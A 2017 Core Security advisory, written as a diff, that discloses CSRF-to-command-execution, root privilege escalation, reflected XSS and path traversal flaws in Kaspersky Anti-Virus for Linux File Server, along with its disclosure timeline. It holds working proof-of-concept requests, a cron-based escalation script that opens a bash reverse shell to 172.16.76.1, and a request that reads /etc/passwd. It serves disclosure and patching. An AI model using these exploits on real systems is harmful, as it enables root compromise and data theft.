@@ -1,0 +1,290 @@
+1. *Advisory Information*
+
+Title: Kaspersky Anti-Virus File Server Multiple Vulnerabilities
+Advisory ID: CORE-2017-0003
+Advisory URL: http://www.coresecurity.com/advisories/Kaspersky-Anti-Virus-File-Server-Multiple-Vulnerabilities
+Date published: 2017-06-28
+Date of last update: 2017-06-28
+Vendors contacted: Kaspersky
+Release mode: Forced release
+
+2. *Vulnerability Information*
+
+Class: Improper Neutralization of Input During Web Page Generation
+('Cross-site Scripting') [CWE-79], Cross-Site Request Forgery [CWE-352],
+Improper Privilege Management [CWE-269], Improper Limitation of a
+Pathname to a Restricted Directory [CWE-22]
+Impact: Code execution, Security bypass, Information leak
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2017-9813, CVE-2017-9810, CVE-2017-9811, CVE-2017-9812
+
+3. *Vulnerability Description*
+
+From Kaspersky Lab's website:
+"Large corporate networks that use file servers running on different
+platforms can be a real headache when it comes to antivirus protection.
+Kaspersky Anti-Virus for Linux File Server is part of our range of new
+and refreshed products, solutions and services for heterogeneous
+networks. It provides a superior protection with Samba server
+integration and other features that can protect workstations and file
+servers in even the most complex heterogeneous networks. It is also
+certified VMware Ready and supports current versions of FreeBSD for
+integrated, future-proof protection."
+
+Multiple vulnerabilities were found in the Kaspersky Anti-Virus for
+Linux File Server [2] Web Management Console. It is possible for a
+remote attacker to abuse these vulnerabilities and gain command
+execution as root.
+
+4. *Vulnerable Packages*
+
+. Kaspersky Anti-Virus for Linux File Server 8.0.3.297 [2]
+Other products and versions might be affected, but they were not tested.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Kaspersky [1] published the following Maintenance Pack:
+   . Maintenance Pack 2 Critical Fix 4 (version 8.0.4.312):
+   https://support.kaspersky.com/13738/
+
+6. *Credits*
+
+This vulnerability was discovered and researched by Leandro Barragan
+and Maximiliano Vidal from Core Security Consulting Services. The
+publication of this advisory was coordinated by Alberto Solino from
+Core Advisories Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+Kaspersky Anti-virus for Linux File Server comes bundled with a Web
+Management Console to monitor the application's status and manage its
+operation.
+
+One specific feature allows configuring shell scripts to be executed
+when certain events occur. This functionality is vulnerable to
+cross-site request forgery, allowing code execution in the context of
+the web application as the kluser account. The vulnerability is
+described in section 7.1.
+
+Moreover, it is possible to elevate privileges from kluser to root by
+abusing the quarantine functionality provided by the kav4fs-control
+system binary. This is described in section 7.2.
+
+Additional web application vulnerabilities were found, including a
+reflected cross-site scripting vulnerability (7.3) and a path traversal
+vulnerability (7.4).
+
+7.1. *Cross-site Request Forgery leading to Remote Command Execution*
+
+[CVE-2017-9810]: There are no Anti-CSRF tokens in any forms on the web
+interface. This would allow an attacker to submit authenticated requests
+when an authenticated user browses an attacker-controlled domain.
+
+The following request will update the notification settings to run a
+shell command when an object is moved to quarantine. For the full list
+of events refer to the product's documentation. Note that it is possible
+to add a script to all existing events in a single request, widening the
+window of exploitation.
+
+The proof-of-concept creates the file /tmp/pepperoni. Shell commands
+are run as the lower privilege kluser.
+
+Payload:
+/-----
+"notifier": {"Actions": [{"Command": "touch /tmp/pepperoni",
+"EventName": 22, "Enable": true, "__VersionInfo": "1 0"}]
+-----/
+
+Request:
+
+/-----
+POST /cgi-bin/cgictl?action=setTaskSettings HTTP/1.1
+Host: <server IP>:9080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0)
+Gecko/20100101 Firefox/52.0
+Accept: application/json, text/javascript, */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Referer: http://<server IP>:9080/
+Content-Length: 3273
+Cookie: wmc_useWZRDods=true; wmc_sid=690DE0005C5625A420255EFEBB3349F7;
+wmc_full_stat=1;
+wmc_logsSimpleMode=1;
+wmc_backupSimpleMode=1; wmc_quaSimpleMode=1;
+wmc_iconsole_lang=resource_en.js;
+wmc_show_settings_descr=false;
+iconsole_test; wmc_show_licence_descr=false
+Connection: close
+
+taskId=7&
+settings=%7B%22ctime%22%3A%201490796963%2C%20%22notifier%22%3A%20%7B%22Actions%22%3A%20%5B%7B%22Command%22%3A%20%22touch%20%2Ftmp%2Fpepperoni%22%2C%20%22EventName%22%3A%2022%2C%20%22Enable%22%3A%20true%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%5D%2C%20%22CommonSmtpSettings%22%3A%20%7B%22DefaultRecipients%22%3A%20%5B%5D%2C%20%22InternalMailerSettings%22%3A%20%7B%22ConnectionTimeout%22%3A%2010%2C%20%22SmtpPort%22%3A%2025%2C%20%22SmtpQueueFolder%22%3A%20%22%2Fvar%2Fopt%2Fkaspersky%2Fkav4fs%2Fdb%2Fnotifier%22%2C%20%22SmtpServer%22%3A%20%22%22%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%2C%20%22Mailer%22%3A%20%221%22%2C%20%22Sender%22%3A%20%22%22%2C%20%22SendmailPath%22%3A%20%22%2Fusr%2Fsbin%2Fsendmail%20-t%20-i%22%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%2C%20%22EnableActions%22%3A%20true%2C%20%22EnableSmtp%22%3A%20false%2C%20%22SmtpNotifies%22%3A%20%5B%7B%22Body%22%3A%20%22%22%2C%20%22Enable%22%3A%20true%2C%20%22EventName%22%3A%201%2C%20%22Recipients%22%3A%20%5B%5D%2C%20%22Subject%22%3A%20%22Anti-Virus%20started%22%2C%20%22UseRecipientList%22%3A%202%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%2C%20%7B%22Body%22%3A%20%22%22%2C%20%22Enable%22%3A%20true%2C%20%22EventName%22%3A%206%2C%20%22Recipients%22%3A%20%5B%5D%2C%20%22Subject%22%3A%20%22License%20error%22%2C%20%22UseRecipientList%22%3A%202%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%2C%20%7B%22Body%22%3A%20%22%22%2C%20%22Enable%22%3A%20true%2C%20%22EventName%22%3A%207%2C%20%22Recipients%22%3A%20%5B%5D%2C%20%22Subject%22%3A%20%22Databases%20updated%22%2C%20%22UseRecipientList%22%3A%202%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%5D%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%2C%20%22snmp%22%3A%20%7B%22MasterAgentXAddress%22%3A%20%22tcp%3Alocalhost%3A705%22%2C%20%22PingInterval%22%3A%2015%2C%20%22TrapSuite%22%3A%20%7B%22AVBasesAppliedEventEnable%22%3A%20true%2C%20%22AVBasesAreOutOfDateEventEnable%22%3A%20true%2C%20%22AVBasesAreTotallyOutOfDateEventEnable%22%3A%20true%2C%20%22AVBasesAttachedEventEnable%22%3A%20true%2C%20%22AVBasesIntegrityCheckFailedEventEnable%22%3A%20true%2C%20%22AVBasesRollbackCompletedEventEnable%22%3A%20true%2C%20%22AVBasesRollbackErrorEventEnable%22%3A%20true%2C%20%22ApplicationSettingsChangedEventEnable%22%3A%20true%2C%20%22ApplicationStartedEventEnable%22%3A%20true%2C%20%22LicenseErrorEventEnable%22%3A%20true%2C%20%22LicenseExpiredEventEnable%22%3A%20true%2C%20%22LicenseExpiresSoonEventEnable%22%3A%20true%2C%20%22LicenseInstalledEventEnable%22%3A%20true%2C%20%22LicenseNotInstalledEventEnable%22%3A%20true%2C%20%22LicenseNotRevokedEventEnable%22%3A%20true%2C%20%22LicenseRevokedEventEnable%22%3A%20true%2C%20%22ModuleNotDownloadedEventEnable%22%3A%20true%2C%20%22NothingToUpdateEventEnable%22%3A%20true%2C%20%22ObjectDeletedEventEnable%22%3A%20true%2C%20%22ObjectDisinfectedEventEnable%22%3A%20true%2C%20%22ObjectSavedToBackupEventEnable%22%3A%20true%2C%20%22ObjectSavedToQuarantineEventEnable%22%3A%20true%2C%20%22RetranslationErrorEventEnable%22%3A%20true%2C%20%22TaskStateChangedEventEnable%22%3A%20true%2C%20%22ThreatDetectedEventEnable%22%3A%20true%2C%20%22UpdateErrorEventEnable%22%3A%20true%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%2C%20%22TrapsEnable%22%3A%20true%2C%20%22__VersionInfo%22%3A%20%221%200%22%7D%7D
+&schedule=%7B%7D&skipCtimeCheck=true
+
+-----/
+
+7.2. *Privilege escalation due to excessive permissions*
+
+[CVE-2017-9811]: The kluser is able to interact with the kav4fs-control
+binary. By abusing the quarantine read and write operations, it is
+possible to elevate the privileges to root.
+
+The following proof-of-concept script adds a cron job that will be
+executed as root.
+
+/-----
+# Make sure the application is running
+/opt/kaspersky/kav4fs/bin/kav4fs-control --start-app
+
+# Create cron job in /tmp
+echo "* * * * * root /tmp/reverse.sh" > /tmp/badcron
+
+# Sample reverse shell payload
+cat > /tmp/reverse.sh << EOF
+#!/bin/bash
+bash -i >& /dev/tcp/172.16.76.1/8000 0>&1
+EOF
+chmod +x /tmp/reverse.sh
+
+# Move the cron job to quarantine and grab the object ID
+QUARANTINE_ID=$(/opt/kaspersky/kav4fs/bin/kav4fs-control -Q
+--add-object /tmp/badcron | cut -d'=' -f2 | cut -d'.' -f1)
+
+# Restore the file to /etc/cron.d
+/opt/kaspersky/kav4fs/bin/kav4fs-control -Q --restore $QUARANTINE_ID
+--file /etc/cron.d/implant
+-----/
+
+7.3. *Reflected cross-site scripting*
+
+[CVE-2017-9813]: The scriptName parameter of the licenseKeyInfo action
+method is vulnerable to cross-site scripting.
+
+/-----
+http://<server
+IP>:9080/cgi-bin/cgictl?action=licenseKeyInfo&do_action=licenseKeyInfo&scriptName=</script><img+src%3dx+onerror%3d"alert(1)"%3b/>&active=&licenseKey=bla
+-----/
+
+7.4. *Path traversal*
+
+[CVE-2017-9812]: The reportId parameter of the getReportStatus action
+method can be abused to read arbitrary files with kluser privileges.
+The following proof-of-concept reads the /etc/passwd file.
+
+/-----
+GET
+/cgi-bin/cgictl?action=getReportStatus&reportId=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+HTTP/1.1
+Host: <server IP>:9080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0)
+Gecko/20100101 Firefox/52.0
+Accept: application/json, text/javascript, */*
+Accept-Language: en-US,en;q=0.5
+Referer: http://<server IP>:9080/
+Cookie: iconsole_test; wmc_useWZRDods=true;
+wmc_sid=99E61AFCD3EC96F5E349AB439DAE46C4; wmc_full_stat=1;
+wmc_logsSimpleMode=1; wmc_backupSimpleMode=0; wmc_quaSimpleMode=1;
+wmc_iconsole_lang=resource_en.js
+Connection: close
+-----/
+
+8. *Report Timeline*
+. 2017-04-03: Core Security sent an initial notification to Kaspersky,
+including a draft advisory.
+. 2017-04-03: Kaspersky confirmed reception of advisory and informed
+they will submit it to the relevant technical team for validation and
+replication.
+. 2017-04-06: Kaspersky confirmed they could reproduce three out of
+five reported vulnerabilities and asked us opinion on their
+justifications about mitigating factors on the other two. They also said
+they would inform us about a fix date in a few days.
+. 2017-04-06: Core Security thanked the confirmation and sent
+justification for one of the vulnerabilities questioned. Core Security
+agreed on removing one reported vulnerability since it can be mitigated
+via a product setting.
+. 2017-04-25: Kaspersky confirmed the rest of the vulnerabilities
+reported and are working on a fix. They said fixes will be released
+"till the June, 30", and also said will inform us the exact dates by
+the end of June.
+. 2017-04-25: Core Security thanked the confirmation of the final
+vulnerabilities list and asked for clarification about the release date.
+. 2017-04-25: Kaspersky clarified they will release the fix by June
+30th and will let us know the exact date by mid June.
+. 2017-06-19: Kaspersky mentioned they would like to go ahead with the
+publication on June 30th and also asked for CVEs.
+. 2017-06-19: Core Security answer back proposing advisory publication
+to be July 3rd in order to avoid advisory publication on a Friday. Also
+asked for clarification about a fix dated June 14th found by Core
+Security researchers and whether or not it fixes the vulnerabilities
+reported.
+. 2017-06-21: Kaspersky answered back stating the fix dated June 14th
+is related to fixes for reported vulnerabilities.
+. 2017-06-21: Core Security asked if the June 14th patch (ID 13738) is
+fixing *all* the vulnerabilities reported in the current advisory. If
+so Core Security will be releasing the advisory sooner than planned.
+Reminded Kaspersky said they would release the fixes by June 30th.
+. 2017-06-22: Core Security sent a draft advisory with the final CVE
+IDs for each vulnerability.
+. 2017-06-23: Kaspersky said they will clarify about patch 13738 ASAP
+and also noted about a typo in the advisory's timeline.
+. 2017-06-23: Core Security requested again we need clarification
+around patch 13738 as soon as possible.
+. 2017-06-26: Core Security reviewed the patch released in June 14th
+and confirmed it addresses all the vulnerabilities reported. Core
+Security informed Kaspersky this advisory will be published as a
+FORCED release on Wednesday 28th.
+. 2017-06-28: Advisory CORE-2017-0003 published.
+
+9. *References*
+
+[1] https://www.kaspersky.com
+[2] https://support.kaspersky.com/linux_file80
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security, is charged with
+anticipating the future needs and requirements for information security
+technologies.
+We conduct our research in several important areas of computer security
+including system vulnerabilities, cyber attack planning and simulation,
+source code auditing, and cryptography. Our results include problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use
+at: http://corelabs.coresecurity.com.
+
+11. *About Core Security*
+
+Courion and Core Security have rebranded the combined company, changing
+its name to Core Security, to reflect the company's strong commitment to
+providing enterprises with market-leading, threat-aware, identity,
+access and vulnerability management solutions that enable actionable
+intelligence and context needed to manage security risks across the
+enterprise. Core Security's analytics-driven approach to security
+enables customers to manage access and identify vulnerabilities, in
+order to minimize risks and maintain continuous compliance. Solutions
+include Multi-Factor Authentication, Provisioning, Identity Governance
+and Administration (IGA), Identity and Access Intelligence (IAI), and
+Vulnerability Management (VM). The combination of these solutions
+provides context and shared intelligence through analytics, giving
+customers a more comprehensive view of their security posture so they
+can make more informed, prioritized, and better security remediation
+decisions.
+
+Core Security is headquartered in the USA with offices and operations in
+South America, Europe, Middle East and Asia. To learn more, contact Core
+Security at (678) 304-4500 or info@coresecurity.com.
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2017 Core Security
+and (c) 2017 CoreLabs, and are licensed under a Creative Commons
+Attribution Non-Commercial Share-Alike 3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
